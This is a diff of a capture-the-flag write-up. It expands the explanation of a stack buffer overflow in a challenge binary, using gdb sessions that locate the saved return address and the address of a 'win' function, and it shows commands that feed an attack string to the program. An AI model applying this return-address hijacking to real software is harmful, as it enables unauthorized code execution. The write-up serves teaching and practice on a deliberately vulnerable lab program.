@@ -12,33 +12,56 @@ After pointing out the initial issue, the developers issued a new update on the 
 
 The C code is fairly simple. If the user enters `"Sup3rs3cr3tC0de"`, then `"Access granted!"` is printed. `"Invalid auth."` is supposed to be printed for any other inputs. This, however, is not the flag we are looking for. It appears from the code that if the function `win` were to somehow be executed, then the flag would be printed.
 
-As the name suggests, the function `vuln` has a buffer overflow vulnerability due to it's use of the notoriously dangerous `gets`. Taking a look at its disassembly, we can also see that it was compiled without stack protectors.
+As the name suggests, the function `vuln` has a buffer overflow vulnerability due to it's use of the notoriously dangerous `gets`. We can get a better understanding of the stack layout by using GNU debugger.
 
 ```sh
-objdump --disassemble=vuln bb1
-```
-
-The goal is to overwrite a return address in the stack so that when `vuln` returns, control goes to `win` instead of back to `main`. In assembly when a procedure is called, the return address (the address of the instruction after `call`) is pushed to the stack. We can get a better understanding of the stack layout by using GNU debugger.
-
-```sh
+chmod u+x bb1
 gdb --quiet bb1
 ```
 
-Execute the following commands inside `gdb`. The program will run until it hits the breakpoint in `vuln`, at which point we examine 8 words from the top of the stack.
+After executing `break vuln` and `run`, the program will run until it hits the breakpoint in `vuln`.
 
 ```txt
-break vuln
-run
-x/8wx $rsp
+(gdb) break vuln
+Breakpoint 1 at 0x401190
+(gdb) run
+Starting program: [redacted]
+
+Breakpoint 1, 0x0000000000401190 in vuln ()
 ```
 
-Below is a sample screenshot of the output from `gdb`. Note that the program has stopped just after pushing `%rbp` and copying `%rsp` into `%rbp`. The instruction `sub $0x30,%rsp` (which has not been executed yet) is for allocating `char buf[48]`.
+The output of `backtrace` shows where execution left off in each function. How do programs remember where each function left off? Every time `f` calls `g`, `f` pushes its "where I left off" address to the stack before jumping to `g`.
 
-![gdb](gdb.png)
+```txt
+(gdb) backtrace
+#0  0x0000000000401190 in vuln ()
+#1  0x0000000000401238 in main ()
+```
 
-Recall that the stack is "upside-down", i.e., pushing to the stack *decrements* the stack pointer. Therefore, the most recently pushed data are at the lowest addresses.
+The output of `x/5i vuln` shows an assembler code dump of the first 5 instructions of `vuln` and also shows an arrow pointing at the next instruction to be executed. The next instruction `sub $0x30,%rsp` is for allocating 48 bytes on the stack for `char buf[48]`.
 
-<!-- TODO: expand this section -->
+```txt
+(gdb) x/5i vuln
+   0x40118c <vuln>:     push   %rbp
+   0x40118d <vuln+1>:   mov    %rsp,%rbp
+=> 0x401190 <vuln+4>:   sub    $0x30,%rsp
+   0x401194 <vuln+8>:   lea    0xe7b(%rip),%rdi        # 0x402016
+   0x40119b <vuln+15>:  callq  0x401030 <puts@plt>
+```
+
+The output of `x/2a $rsp` shows two address-width (8 bytes each) values on the top of the stack. Since `push %rbp` was the most recent stack operation, the saved value of `%rpb` resides on the top of the stack. Next comes the address `0x401238` which is the same address we saw in `backtrace`.
+
+```txt
+(gdb) x/2a $rsp
+0x7fffffffdba0: 0x7fffffffdbb0  0x401238 <main+74>
+```
+
+Using `print win` is one of **many** ways to obtain the address of `win`. The goal of our attack will be to overwrite the return address `0x401238` with `0x401172` so that control goes to `win` instead of back to `main`.
+
+```txt
+(gdb) print win
+$1 = {<text variable, no debug info>} 0x401172 <win>
+```
 
 ### Crafting the Attack String
 
@@ -62,7 +85,6 @@ The string that needs to be typed in contains unprintable characters. Therefore,
 ```sh
 gcc mal.c -o mal              # compile mal.c
 ./mal > attack                # save the attack string in a file
-chmod u+x bb1                 # grant user execute permission on bb1
 echo 'dummy flag' > flag.txt  # dummy flag
 ./bb1 < attack                # run bb1 with attack string input
 ```
